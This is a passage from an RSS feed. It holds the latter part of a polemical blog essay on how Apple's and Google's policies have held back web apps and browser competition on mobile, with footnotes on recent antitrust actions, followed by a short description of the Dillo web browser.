<p>As an example, the <a href="https://infrequently.org/2023/02/safari-16-4-is-an-admission/">eight-year delay</a> in implementing Push Notifications for the web<sup><a href="#fn-checkbox-compliance-3" id="fnref-checkbox-compliance-3">[3]</a></sup> kept many businesses from giving the web a second thought. If they couldn't re-engage users at the same rates as native apps, the web might as well not exist on phones. This logic has played out on a loop over the last decade, category-by-category, with gatekeepers preventing competing browsers from bringing capabilities to web apps that would let them supplant app stores<sup><a href="#fn-convergent-agendas-2" id="fnref-convergent-agendas-2:1">[2:1]</a></sup> while simultaneously keeping them from being discovered through existing stores.</p>
<p>Proper browser choice could upend this situation, finally allowing the web to provide "table stakes" features in a compelling way. For the first time, developers could bring the modern web's full power to wealthy mobile users, enabling the "write once, test everywhere" vision, and cut out the app store middleman — all without sacrificing essential app features or undermining security.</p>
<p>Sunsetting the 30% tax requires a compelling alternative, and Apple's simultaneous underfunding of Safari and compelled adoption of its underpowered engine have interlocked to keep the web out of the game. No wonder Apple is massively funding lobbyists, lawyers, and <a href="https://www.bloomberg.com/news/articles/2022-09-19/apple-flexes-muscle-as-quiet-power-behind-app-developer-group">astroturf groups</a> to keep engine diversity at bay while belatedly <a href="https://infrequently.org/2023/02/safari-16-4-is-an-admission/">battening the hatches</a>.</p>
<p>On the business side, managers think about "mobile" as a category. Rather than digging into the texture of iOS, Android, and the differing web features available on each, businesses tend to bulk accept or reject the app store model. One sub-segment of "mobile" growing the ability to route around highway robbery Ts &amp; Cs is tantalising, but not enough to change the game; the web, like other metaplatforms, is only a disruptive force when pervasive and capable.<sup><a href="#fn-self-censorship-4" id="fnref-self-censorship-4">[4]</a></sup></p>
<p>A prohibition on store discovery for web apps has buttressed Apple's denial of essential features to browsers:</p>
<figure>
<a href="https://developer.apple.com/app-store/review/guidelines/#2.4" alt="Even if developers overcome the ridiculous hurdles that Apple's shoddy browser engine throws up, they're still <a href='https://developer.apple.com/app-store/review/guidelines/#2.4'>prevented by Apple policy</a> from making interoperable web apps discoverable where users look for them.">
<picture width="626" height="136">
  <source sizes="(max-width: 1200px) 70vw, 600px" srcset="https://infrequently.org/2024/01/the-web-is-the-app-store/apple_4.2._highlight_minimum-functionality.png?nf_resize=fit&amp;w=3600 2400w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/apple_4.2._highlight_minimum-functionality.png?nf_resize=fit&amp;w=2400 1600w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/apple_4.2._highlight_minimum-functionality.png?nf_resize=fit&amp;w=1800 1200w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/apple_4.2._highlight_minimum-functionality.png?nf_resize=fit&amp;w=1200   800w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/apple_4.2._highlight_minimum-functionality.png?nf_resize=fit&amp;w=900   600w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/apple_4.2._highlight_minimum-functionality.png?nf_resize=fit&amp;w=750   500w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/apple_4.2._highlight_minimum-functionality.png?nf_resize=fit&amp;w=600   400w">
<img src="https://infrequently.org/2024/01/the-web-is-the-app-store/apple_4.2._highlight_minimum-functionality.png" alt="Even if developers overcome the ridiculous hurdles that Apple's shoddy browser engine throws up, they're still <a href='https://developer.apple.com/app-store/review/guidelines/#2.4'>prevented by Apple policy</a> from making interoperable web apps discoverable where users look for them." width="626" height="136" decoding="async" loading="lazy">
</picture>

</a>
  <figcaption>Even if developers overcome the ridiculous hurdles that Apple's shoddy browser engine throws up, they're still <a href="https://developer.apple.com/app-store/review/guidelines/#2.4">prevented by Apple policy</a> from making interoperable web apps discoverable where users look for them.</figcaption>
</figure>
<p><a href="https://developer.chrome.com/docs/android/trusted-web-activity">Google's answer to web apps in Play is a dog's breakfast</a>, but it <em>does</em> at least exist for developers willing to put in the effort, or for teams savvy enough to reach for <a href="https://www.pwabuilder.com/">PWA Builder.</a></p>
<p>Recent developments also point to a competitive future for capable web apps.</p>
<p>First, browser engine choice should become a reality on iOS in the EU in 2024, thanks to the plain language of the DMA. Apple will, of course, attempt to delay the entry of competing browsers through as-yet-unknown strategies, but the clock is ticking. Once browsers can enable capable web apps with easier distribution, the logic of the app store loses a bit of its lustre.</p>
<p>Work is also underway to give competing browsers a <a href="https://github.com/MicrosoftEdge/MSEdgeExplainers/blob/main/WebInstall/explainer_cross_domain.md">chance to facilitate PWAs that can install other PWAs.</a> Web App Stores would then become a real possibility through browsers that support them, and we should expect that regulatory and legislative interventions will facilitate this in the near future. Removed from the need to police security (browsers have that covered) and handle distribution (websites update themselves), PWA app stores like <a href="https://store.app/">store.app</a> can become honest-to-goodness app management surfaces that can safely facilitate discovery and sync.</p>
<figure>
<figure>
<img src="https://infrequently.org/2024/01/the-web-is-the-app-store/appsco.pe.webp" decoding="async" loading="lazy">
<img src="https://infrequently.org/2024/01/the-web-is-the-app-store/store.app.webp" decoding="async" loading="lazy">
</figure>
<figcaption>
  PWA app stores like <a href="https://appsco.pe/" target="_new">Appscope</a> and <a href="https://store.app/">store.app</a> exist, but they're hobbled by gatekeepers that have denied competing browsers access to APIs that could turn PWA directories into real contenders.
<figcaption>
</figcaption></figcaption></figure>
<p>It's no surprise that Apple and Google have kept private the APIs needed to make this better future possible. They built the necessary infrastructure for the web to disrupt native, then kept it to themselves. This potential has remained locked away within organisations politically hamstrung by native app store agendas. But all of that is about to change.</p>
<p>This begs the question: where's the coverage? This is the most exciting moment in more than 15 years for the web vs. native story, but the tech press is whiffing it.</p>
<h2 id="a-new-hope">A New Hope <a href="#a-new-hope">#</a></h2>
<p>2024 will be packed to the gills with app store and browser news, from implementation of the DMA, to the UK's renewed push into mobile browsers and cloud gaming, to new legislation arriving in many jurisdictions, to the first attempts at shipping iOS ports of Blink and Gecko browsers. Each event is a chance to inform the public about the already-raging battle for the future of the phone.</p>
<p>It's still possible to reframe these events and provide better context. We need a fuller discussion about what it will mean for mobile OSes to have competing native app stores when the underlying OSes are foundationally insecure. There are also existing examples of ecosystems with this sort of choice (e.g., China), and more needs to be written about the implications for users and developers. Instead of nirvana, the insecure status quo of today's mobile OSes, combined with (even more) absentee app store purveyors, turns side-loading into an alternative form of lock-in, with a kicker of added insecurity for users. With such a foundation, the tech-buying public could understand why a browser's superior sandboxing, web search's better discovery, and frictionless links are better than dodgy curation side-deals and <a href="https://www.theverge.com/c/22611236/epic-v-apple-emails-project-liberty-app-store-schiller-sweeney-cook-jobs#:~:text=%E2%80%9CRegarding%20review%20processes,we%20can%20detect%3F%E2%80%99%E2%80%9D"><em>"beware of dog"</em> sign security.</a></p>
<p>The more that folks understand the stakes, the more likely tech will genuinely change for the better. And isn't that what public interest journalism is <em>for</em>?</p>

<hr>
<section>
<ol>
<li id="fn-recent-antitrust-news-1"><p><a href="https://www.theverge.com/antitrust">Antitrust is now a significant tech beat</a>, and recent events frequently include browser choice angles because regulators keep writing regulations that will enhance it. This beat is only getting more intense, giving the tech press ample column inches to explain the status quo more deeply and and educate around the most important issues.</p>
<p>In just the last two months:</p>
<ul>
<li>
<p>Google lost to Epic in a <a href="https://www.theverge.com/23994174/epic-google-trial-jury-verdict-monopoly-google-play">jury trial that determined Google's Play Store is an illegal monopoly.</a></p>
</li>
<li>
<p>Google <a href="https://www.theverge.com/23945184/epic-v-google-fortnite-play-store-antitrust-trial-updates/archives/3#stream-entry-d3f7f1e3-0891-475e-95f8-0b0a4320e371">lost all assumption of good faith</a> as evidence from the Epic trial <a href="https://www.theverge.com/2023/11/13/23959570/samsung-knew-the-project-banyan-deal-was-anticompetitive">showed the Play team to be scoundrels</a>, <a href="https://www.theverge.com/2023/11/15/23962589/i-dont-know-if-ensuring-fairness-was-part-of-my-job-i-never-thought-of-it-that-way">two-timers</a>, and <a href="https://www.theverge.com/2023/11/9/23954111/google-boasted-it-got-riot-games-not-to-launch-its-own-app-store-by-offering-10m">cretins</a> who were willing to set <a href="https://www.theverge.com/2023/11/20/23969690/google-spotify-android-billing-commission-secret-deal">shockingly unfair terms</a> for <a href="https://www.theverge.com/23954852/google-netflix-app-store-deal-play-10-percent-revshare">anyone</a> with enough market power to embarrass them. And that's before we get to the <a href="https://gizmodo.com/google-denies-its-project-hug-bribed-20-developers-1851009202">light attempted bribery.</a></p>
</li>
<li>
<p>Google's <a href="https://arstechnica.com/gadgets/2023/11/googles-36-search-revenue-share-with-apple-is-3x-what-android-oems-get/">witness also blurted out a statistic that is both anodyne and damning: 36%.</a> That's what Google pays Apple in search rev-share for default search placement in Safari. Normally, this would be a detail of a boring business deal. In context, however, it highlights Apple's decade-long suppression of iOS browser competition — combined with <a href="https://wpt.fyi/results/?label=experimental&amp;label=master&amp;aligned">poverty-level funding of WebKit</a> — which has <a href="https://www.theverge.com/2023/11/14/23960819/pichai-admits-google-pays-apple-a-36-percent-revenue-share-for-search-results">skimmed tens of billions in profit <em>per year</em> from the web</a> while starving browser development. This has deprived users, businesses, and web developers of safe (but critical) capabilities. It wasn't just Play that buggered the mobile web; Google was happy to outsource the dirty deed too.</p>
</li>
<li>
<p>Apple <a href="https://caselaw.nationalarchives.gov.uk/ewca/civ/2023/1445">lost on an appeal</a> to keep the UK's Competition and Market Authority (CMA) <a href="https://www.gov.uk/cma-cases/mobile-browsers-and-cloud-gaming">investigation into browsers and cloud gaming</a> on ice.<sup><a href="#fn-mir-icing-5" id="fnref-mir-icing-5">[5]</a></sup></p>
</li>
<li>
<p>In December, Apple <a href="https://open-web-advocacy.org/blog/cma-reopens-investigation-into-apple/">declined to appeal to the UK's Supreme Court</a> for reasons that remain opaque.</p>
<p>Perhaps Apple didn't appeal because, in November, the UK unexpectedly brought forward the <a href="https://bills.parliament.uk/bills/3453">Digital Markets, Competition and Consumers Bill.</a> It looks set to become law early in the new year, standing up a regulator with real teeth who, one presumes, will not be predisposed to think well of Apple's delay of its predecessor's investigations.</p>
</li>
<li>
<p>Meanwhile, in the EU, Apple attempted to wriggle out of regulations that might bring about proper browser choice by <a href="https://www.theregister.com/2023/11/02/apple_safari_browser/">arguing that Safari is actually <em>three</em> under-performing browsers.</a> in <a href="https://brucelawson.co.uk/2023/apples-eu-legal-shenanigans/">a marketing trenchcoat</a><sup><a href="#fn-hair-splitting-6" id="fnref-hair-splitting-6">[6]</a></sup>.</p>
</li>
<li>
<p>On the other side of the planet, <a href="https://asia.nikkei.com/Business/Technology/Japan-to-crack-down-on-Apple-and-Google-app-store-monopolies">news just broke that Japan will bring forward legislation</a> to target app store shenanigans. Given the JFTC's earlier findings about how interlocking layers of control have kept browsers from contesting app store prominence, we can expect some spicy legislative language around browsers.</p>
</li>
<li>
<p>Australia has also <a href="https://open-web-advocacy.org/blog/new-digital-competition-laws-for-australia/">just agreed (in principle) to do the same</a>, including language that acknowledges the role suppressing browser choice has had in preventing the web from competing with mobile native app ecosystems.</p>
</li>
</ul>
<p>All but one of the 19 links above are from just the last 60 days, a period which includes a holiday break in the US and Europe. With the EU's DMA coming into force in March and the CMA back on the job, browser antitrust enforcement is only accelerating. It sure would be great if reporters could occasionally connect these dots. <a href="#fnref-recent-antitrust-news-1">↩︎</a></p>
</li>
<li id="fn-convergent-agendas-2"><p>The stories of how Apple and Google have kept browsers from becoming real app stores differ greatly in their details, but the effects have been nearly identical: only their browsers could offer installation of web apps, and those browsers have done shockingly little to support web developers who want to depend on the browser as the platform.</p>
<p>The ways that Apple has undermined browser-based stores is relatively well known: no equivalent to PWA install or <a href="https://bugs.webkit.org/show_bug.cgi?id=255858">"Smart Banners" for the web</a>, no way for sites to <a href="https://bugs.webkit.org/show_bug.cgi?id=259490">suppress promotion of native apps</a>, no ability for competing browsers to trigger homescreen installation until just this year, etc. etc. The decade-long build of Apple's many and varied attacks on the web as a platform is a story that's both tired and under-told.</p>
<p>Google's malfeasance has gotten substantially less airtime, even among web developers – nevermind the tech press.</p>
<p>The story picks up in 2017, two years after the <a href="https://blog.chromium.org/2015/03/chrome-42-beta-push-notifications_12.html">release of PWAs and Push Notifications in Chrome.</a> At the time, the PWA install flow was something of a poorly practised parlour trick: installation used an unreliable homescreen shortcut API that failed on many devices with OEM-customised launchers. The shortcut API also came laden with baggage that prevented effective uninstall and cross-device sync.</p>
<p>To improve this situation, <a href="https://web.dev/articles/webapks">"WebAPKs" were developed.</a> This new method of installation allows for deep integration with the OS, similar to the Application Identity Proxy feature that Windows lets browsers to provide for PWAs, with one notable exception: on Android, only Chrome gets to use the WebAPK system.</p>
<p>Without getting into the weeds, suffice to say many non-Chrome browsers requested access. Only Google could meaningfully provide this essential capability across the Android ecosystem. So important were WebAPKs that Samsung gave up begging and <a href="https://medium.com/samsung-internet-dev/new-year-new-samsung-internet-b74f282e4429">reverse engineered it for their browser</a> on Samsung devices. This only worked on Samsung phones where Suwon's engineers could count on device services and system keys not available elsewhere. That hasn't helped other browsers, and it certainly isn't an answer to an ecosystem-level challenge.</p>
<p>Without WebAPK API access, competing browsers can't innovate on PWA install UI and can't meaningfully offer PWA app stores. Instead, the ecosystem has been left to limp along at the excruciating pace of Chrome's PWA UI development.</p>
<p>Sure, Chrome's PWA support has been a damn sight better than Safari's, but that's just damning with faith praise. Both Apple and Google have done their part to quietly engineer a decade of unchallenged native app dominance. Neither can be trusted as exclusive stewards of web competitiveness. Breaking the lock on the doors holding back real PWA installation competition will be a litmus test for the effectiveness of regulation now in-flight. <a href="#fnref-convergent-agendas-2">↩︎</a> <a href="#fnref-convergent-agendas-2:1">↩︎</a></p>
</li>
<li id="fn-checkbox-compliance-3"><p>Push Notifications were, without exaggeration, the single most requested mobile Safari in the eight years between when Chromium browsers shipped them and when Apple finally capitulated.</p>
<p>It's unedifying to recount all of the ways Apple prevented competing iOS browsers from implementing Push, all while gaslighting developers who requested this business-critical feature over and over and over again. It's also unhelpful to fixate on the runarounds that Apple gave companies with enough clout to somehow find an Apple rep to harangue directly. So, let's call it water under the bridge. Apple <a href="https://developer.apple.com/documentation/usernotifications/sending_web_push_notifications_in_web_apps_and_browsers">shipped</a>, so we're good, right?</p>
<p>Right?</p>
<p>I regret to inform you, dear reader, that it not, in fact, "good".</p>
<p>Despite most of a decade to study up on the problem space, and nearly <a href="https://en.wikipedia.org/wiki/Apple_Push_Notification_service">15 years of of experience</a> with Push, Apple's implementation is anything but complete.</p>
<p>The first few releases exposed APIs that hinted at important functionality, but were broken or missing. Features as core as closing notifications, or updating text when new data comes in. Think, showing the latest message in a chat, rather than leaving a stream of notifications in the tray for every message that has arrived since you last cleared the tray.</p>
<p>Important features didn't work. <a href="https://bugs.webkit.org/show_bug.cgi?id=258922">Some still don't.</a>. And the pathetic set of customisations provided for notification UI is a joke.</p>
<p>Web developers have once again been left to dig through the wreckage to understand just how badly Apple's <em>cough</em> "minimalist" <em>cough</em> implementation is compromised. And boy howdy, is it bad.</p>
<p>Apple's implementation might have <a href="https://wpt.fyi/results/notifications?label=experimental&amp;label=master&amp;aligned">passed surface-level tests</a> (gotta drive up that score!), but it's unusable for serious products. It's possible to draw many possible conclusions from this terrible showing, but even the relative charity of Hanlon's Razor is damning.</p>
<p>Nothing about this would be worse than any other under-funded, trailing-edge browser over the past three decades (which is to say, a bloody huge problem), except for Apple's well-funded, aggressive, belligerent ongoing protest to every regulatory attempt to allow true browser choice for iPhone owners.</p>
<p>In the year 2024, you can have any iOS browser you like. You can even set them as default. They <em>might</em> even have APIs that look like they'll solve important product needs, but as long as they're forced to rely on Apple's shit-show implementation, the web can't ever be a competitive platform.</p>
<p>When Apple gets to define the web's potential, the winner will always be native, and through it, Apple's bottom line. <a href="#fnref-checkbox-compliance-3">↩︎</a></p>
</li>
<li id="fn-self-censorship-4"><p>The muting effect of Apple's abuse of monopoly over wealthy users to kneecap the web's capabilities is aided by the self-censorship of web developers. The values of the web are a mirror world to native, where developers are feted for adopting bleeding-edge APIs. On the web, features aren't "available" until 90+% of all users have access to them. Because <a href="https://analytics.wikimedia.org/dashboards/browsers/#all-sites-by-os-and-browser">iOS is at least 20%</a> of <a href="https://gs.statcounter.com/browser-market-share/">the pie</a>), web developers don't go near features Apple fails to support. Which is a <em>lot</em>.</p>
<figure>
  <picture>
    <img src="https://infrequently.org/2024/01/the-web-is-the-app-store/caniuse_browser_scores.webp" decoding="async" loading="lazy">
  </picture>
  <figcaption>
    caniuse.com's <a href="https://caniuse.com/#:~:text=See%20full%20list-,Browser%20scores,-Current%20version">"Browser Score"</a> is one way to understand the scale of the gap in features that Apple has forced on all iOS browsers.
  </figcaption>
</figure>
<figure>
  <picture>
    <img src="https://infrequently.org/2024/01/the-web-is-the-app-store/wpt_browser_specific_failures.webp" decoding="async" loading="lazy">
  </picture>
  <figcaption>
    The <a href="https://wpt.fyi/">Web Platform Tests dashboard</a> highlights 'Browser Specific Failures', which only measure failures <em>in tests for features the browser claims to support</em>. Not only are iOS browsers held back by Apple's shockingly poor feature support, but the features that _are_ available are broken so often that many businesses feel no option but to retreat to native APIs that Apple doesn't break on a whim, forcing the logic of the app store on them if they want to reach valuable users.
  </figcaption>
</figure>
<p>Apple's pocket veto over the web is no accident, and its abuse of that power is no bug.</p>
<p>Native app stores can only take an outsized cut if the web remains weak and developers stay dependent on proprietary APIs to access commodity capabilities. A prohibition on capable engines prevents feature parity, suppressing competition. A feature-poor, unreliable open web is essential to prevent the dam from breaking.</p>
<p>Why, then, have competing browser makers played along? Why aren't Google, Mozilla, Microsoft, and Opera on the ramparts, waving the flag of engine choice? Why do they silently lend their brands to Apple's campaign against the web? Why don't they rename their iOS browsers to "Chrome Lite" or "Firefox Lite" until genuine choice is possible? Why don't they ask users to write their representatives or sign petitions for effective browser choice? It's not like they shrink from it for <a href="https://blog.mozilla.org/en/mozilla/news/mozilla-joins-net-neutrality-blackout-for-break-the-internet-day/">other worthy causes.</a></p>
<p>I'm shocked by not surprised by the tardiness of browser bosses to seize the initiative. Instead of standing up to unfair terms, they've rolled over time and time again. It makes a perverse sort of sense.</p>
<p>More than 30 years have passed since we last saw <a href="https://en.wikipedia.org/wiki/History_of_Unix#:~:text=In%201983%2C%20the%20U.S.%20Department,System%20V%20into%20the%20market.">effective tech regulation.</a> The careers of those at the top have been forged under the unforgiving terms of late-stage, might-makes-right capitalism, rather than the logic of open markets and standards. Today's bosses didn't rise by sticking their necks above the parapets to argue virtue and principle. At best, they kept the open web dream alive by quietly nurturing the potential of open technology, hoping the situation would change.</p>
<p>Now it has, and yet they cower.</p>
<p>Organisations that value conflict aversion and <em>"the web's lane is desktop"</em> thinking get as much of it as they care to afford. <a href="#fnref-self-censorship-4">↩︎</a></p>
</li>
<li id="fn-mir-icing-5"><p>Recall that Apple <a href="https://www.reuters.com/technology/apple-wins-appeal-against-uks-decision-investigate-its-mobile-browser-2023-03-31/">won an upset victory in March</a> after litigating the meaning of the word "may" and arguing that the CMA wasn't wrong to find after multiple years of investigations that Apple were (to paraphrase) inveterate shitheels, but rather that the CMA waited <em>too long</em> (six months) to bring an action which might have had teeth.</p>
<p>Yes, you're reading that right; Apple's <em>actual</em> argument to the Competition Appeal Tribunal amounted to a mashup of rugged, free-market fundamentalist <em>" but mah regulatory certainty!"</em>, performative fainting into strategically placed couches, and feigned ignorance about issues it knows it'll have to address in other jurisdictions.</p>
<p>Thankfully, the Court of Appeals was not to be taken for fools. Given the <a href="https://caselaw.nationalarchives.gov.uk/ewca/civ/2023/1445#:~:text=In%20my%20judgement%2C%20the%20CAT%20lost%20sight%20of%20this%20consideration.%20There%20is%20no%20overarching%20principle%20that%20an%20undertaking%20is%20entitled%20to%20be%20investigated%20once%2C%20and%20once%20only.">harsh (in British) language</a> of the reversal, we can hope a chastened Competition Appeal Tribunal will roll over less readily in future. <a href="#fnref-mir-icing-5">↩︎</a></p>
</li>
<li id="fn-hair-splitting-6"><p>If you're getting the sense that legalistic hair-splitting is what Apple spends its <a href="https://venturebeat.com/mobile/apples-former-top-lawyer-1-billion-budget-enabled-high-risk-strategies/">billion-dollar-per-year legal budget</a> on because it has neither the facts nor real benefits to society on its side, <a href="http://www.fosspatents.com/2023/02/japans-competition-authority-jftc.html">wait 'till you hear about some of the stuff it filed with Japan's Fair Trade Commission!</a></p>
<p>A clear strategy is being deployed. Apple:</p>
<ul>
<li>First claims there's <a href="https://www.congress.gov/116/meeting/house/110883/witnesses/HHRG-116-JU05-Wstate-CookT-20200729.pdf">no there there (pdf).</a> When that fails...</li>
<li>Claims competitors that it has expressly ham-strung are credible substitutes. When that fails...</li>
<li>Claims security would suffer if reasonable competition were allowed. Rending of garments is performed while prophets of doom recycle the script that the sky will fall if competing browsers are allowed (which would, in turn, expand the web's capabilities). Many treatments of this script fill the inboxes of regulators worldwide. When those bodies investigate, e.g. the history of iOS's forced-web-monoculture insecurity, and inevitably reject these farcical arguments, Apple...</li>
<li>Uses any and every procedural hurdle to prevent intervention in the market it has broken.</li>
</ul>
<p>The modern administrative state indulges firms with <em>"as much due process as money can buy"</em>, and Apple knows it, viciously contesting microscopic points. When bluster fails, <a href="https://infrequently.org/2022/02/minimum-standards/">huffingly implemented, legalistic, hair-splitting "fixes" are deployed</a> on the slowest possible time scale. This strategy buys years of delay, and it's everywhere: browser and mail app defaults, payment alternatives, engine choice, and right-to-repair. Even charging cable standardisation took years longer than it should have thanks to stall tactics. This maximalist, joined-up legal and lobbying strategy works to exhaust regulators and bamboozle legislators. Delay favours the monopolist.</p>
<p>A firm that can <a href="https://www.youtube.com/watch?v=17p3ThgMQYo">transform the economy of an entire nation</a> just by paying a bit of the tax it owes won't even notice a line item for lawyers to argue the most outlandish things at every opportunity. Apple (correctly) calculates that regulators are gun-shy about punishing them for delay tactics, so engagement with process is a is a win by default. Compelling $1600/hr white-shoe associates to make ludicrous, unsupportable claims is a <em>de facto</em> win when delay brings in billions. Regulators are too politically cowed and legally ham-strung to do more, and Apple plays process like a fiddle. <a href="#fnref-hair-splitting-6">↩︎</a></p>
</li>
</ol>
</section>

    
    
  </article>
      <!-- END_BLOCK_CONTENT -->
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Resurrecting the Dillo Browser (553 pts)]]></title>
            <link>https://dillo-browser.github.io/</link>
            <guid>38847613</guid>
            <pubDate>Tue, 02 Jan 2024 21:55:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dillo-browser.github.io/">https://dillo-browser.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=38847613">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
      
      <p>Dillo is a fast and small graphical web browser with the following features: </p>
      <ul>
        <li>Multi-platform, running on Linux, BSD, MacOS and even Atari.</li>
        <li>Written in C and C++ with few dependencies.</li>
        <li>Implements its own real-time rendering engine.</li>
        <li>Low memory usage and fast rendering, even with large pages.</li>
        <li>Uses the fast and bloat-free <a href="https://www.fltk.org/">FLTK</a> GUI library.</li>
        <li>Support for HTTP, HTTPS, FTP and local files.</li>
        <li>Extensible with plugins written in any language
          (<a href="https://github.com/topics/dillo-plugin">search on GitHub</a>).
        </li>
        <li>Is free software licensed with the GPLv3.</li>
        <li>Helps authors to comply with web standards by using the
          <a href="https://dillo-browser.github.io/old/help/bug_meter.html">bug meter</a> 
          <img src="https://dillo-browser.github.io/img/bugmeter.png">.</li>
      </ul>

      <h2>Screenshots</h2>
      <p><a href="https://dillo-browser.github.io/img/plan9.png"><img src="https://dillo-browser.github.io/img/mini-plan9.png"></a>
      <a href="https://dillo-browser.github.io/img/armadillo.png"><img src="https://dillo-browser.github.io/img/mini-armadillo.png"></a>
      <a href="https://dillo-browser.github.io/img/suckless.png"><img src="https://dillo-browser.github.io/img/mini-suckless.png"></a>
      <a href="https://dillo-browser.github.io/img/aaronsw.png"><img src="https://dillo-browser.github.io/img/mini-aaronsw.png"></a>
      <a href="https://dillo-browser.github.io/img/hackernews.png"><img src="https://dillo-browser.github.io/img/mini-hackernews.png"></a>
      <a href="https://dillo-browser.github.io/img/100r.png"><img src="https://dillo-browser.github.io/img/mini-100r.png"></a></p><p>...check <a href="https://dillo-browser.github.io/old/screenshots/index.html">the archives</a> for more pictures.</p>
      <h2>Project objectives</h2>
      <ul>
        <li>Lower the barrier of entry to the web.</li>
        <li>Support old or small machines and slow connections.</li>
        <li>Personal security and privacy.</li>
        <li>High software efficiency.</li>
      </ul>
      <p>
      Check the <a href="https://dillo-browser.github.io/old/index.html">old website</a> for more details.
      </p>
      <h2>Download</h2>
      <p>Download Dillo from the
      <a href="https://github.com/dillo-browser/dillo/">git repository</a>
      and follow the instructions in the README to install it.
      </p>
      <h2>Contributing</h2>
      <p>We always welcome contributions, here are several ways in which
      you can help:</p>
      <ul>
        <li>Use Dillo to browse the web and if you find something that
          is not working,
          <a href="https://github.com/dillo-browser/dillo/issues/new">report it</a>.
        </li>
        <li>Spread the word, so the world knows Dillo exists and is
          still alive.</li>
        <li>Implement some new feature or fix some bug and send us a
          patch or create a pull request.</li>
      </ul>
    </div></div>]]></description>
        </item>
    </channel>
</rss>